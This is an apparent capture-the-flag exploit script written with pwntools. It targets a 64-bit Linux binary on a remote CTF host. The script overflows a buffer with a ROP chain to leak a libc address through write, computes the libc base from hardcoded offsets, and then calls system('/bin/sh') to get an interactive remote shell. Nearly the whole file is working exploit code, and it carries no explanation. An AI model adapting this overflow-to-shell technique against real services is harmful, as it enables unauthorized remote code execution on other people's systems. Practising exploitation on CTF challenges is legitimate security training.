# import time
from pwn import *

# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 9999)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
# io = remote("112.6.51.212", 30362)
# io = remote("8.130.35.16", 51003)
io = remote("dasctf_sixbytes.node.game.sycsec.com", 31093)
# io = process('./q2')
# gdb.attach(io)
context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('chal')


# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

elf_got = 0x404018
write_plt = 0x404018
write_bye = 0x401288
pop_rdi = 0x0000000000401333
pop_rsi_r15_ret = 0x0000000000401331

payload = b'\x00' + b'a' * 0x17 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_plt) + p64(0) + p64(write_bye) + p64(0x4011FD)
ru("backdoor!")
sl(payload)
libc_base = get_addr() - 0x10E060
sys_addr = libc_base + 0x52290
binsh = libc_base + 0x1B45BD

payload1 = b'\x00' + b'a' * 0x17 + p64(pop_rdi) + p64(binsh) + p64(sys_addr)
sl(payload1)
inter()
